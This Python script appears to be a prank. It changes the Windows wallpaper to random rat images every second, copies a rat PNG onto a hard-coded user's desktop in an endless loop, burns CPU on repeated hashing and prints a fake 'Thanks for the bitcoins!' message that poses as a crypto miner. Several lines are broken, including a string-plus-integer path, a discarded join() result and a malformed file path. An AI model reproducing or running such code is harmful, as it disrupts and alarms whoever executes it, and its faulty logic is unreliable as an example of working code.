import ctypes
import random
import os
import time
import shutil
import threading
import hashlib
import colorama

def get_dir():
    return os.listdir("./rats")
def get_desktop():
    # get the path to the desktop directory
    return os.path.join("C:\\Users\\Roni\\", 'Desktop')
def get_china():
    
    # Set the range of Unicode code points for Chinese characters
    start = int('0x4e00', 16)
    end = int('0x9fff', 16)

    # Generate a random integer within the range of Chinese characters
    char_code = random.randint(0x4e00, 0x9fff)

    # Convert the integer to a Chinese character
    return chr(char_code)

def get_chinese():
    china_sentence = ""
    china_sentence.join([get_china() for i in range(25)])
    return china_sentence

def get_hash(data):
    # Convert the data to bytes
    data = str(data)
    if isinstance(data, str):
        data = data.encode('utf-8')

    # Calculate the padding length
    data_len = len(data)
    padding_len = (64 - (data_len + 8) % 64) % 64

    # Add the padding
    data += b'\x80' + b'\x00' * (padding_len - 1)

    # Add the data length in bits as a 64-bit big-endian integer
    data += (data_len * 8).to_bytes((data_len * 8).bit_length() // 8 + 1, 'big')


    # Hash the padded data using SHA-256
    return hashlib.sha256(data).hexdigest()

    
def copy_file_to_desktop():
    print(get_chinese())
    shutil.copyfile(os.path.abspath(".\\rats\\rat-removebg-preview.png\\"), get_desktop()+random.randint(1, 3048394839483948)+".png")


print(os.path.abspath("\\rats\\" + random.choice(get_dir())))
SPI_SETDESKWALLPAPER = 20
try:

  #os.environ['LANG'] = 'zh_CN.UTF-8'
  pass
except:
   print("FAILED LANGUAGE")

def rat_bg():
    while 1:
        # call the Windows API function to change the wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, os.path.abspath(".\\rats\\" + random.choice(get_dir())), 3)
        time.sleep(1)

threading.Thread(target=rat_bg, daemon=True).start()
i = 0
hashes = []
start_time = None
while 1:
    if len(hashes) == 0:
        start_time = time.time()
     
    elif len(hashes) > 100000:
        print(str(100000/(time.time()-start_time)), "hashes a second! Thanks for the bitcoins!")
        start_time = None
        hashes = []
        continue
    copy_file_to_desktop()
    hashes.append(get_hash(get_hash(i)))
   
    i+=1